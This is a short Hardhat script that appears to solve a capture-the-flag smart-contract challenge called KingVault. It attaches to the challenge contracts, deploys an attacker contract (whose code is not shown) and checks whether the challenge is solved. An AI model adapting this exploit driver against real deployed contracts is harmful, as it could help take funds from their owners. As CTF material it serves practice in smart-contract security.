const { parseEther } = require("ethers/lib/utils");
const { setGracefulCleanup } = require("tmp");

async function main() {
  const EXPLOIT = await ethers.getContractFactory("agusduhaAttacker");

  const setup = await ethers.getContractAt( "Setup", "0x459D9C80482c541deC1Aa491209EF598BF7c9344" );
  const ctf = await ethers.getContractAt( "KingVault", "0x1020dffd73141616fa7a931fee757dc9114b79d9" );

  console.log("solved:", await setup.isSolved());

  const exploit = await EXPLOIT.deploy(setup.address);

  console.log("solved:", await setup.isSolved());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
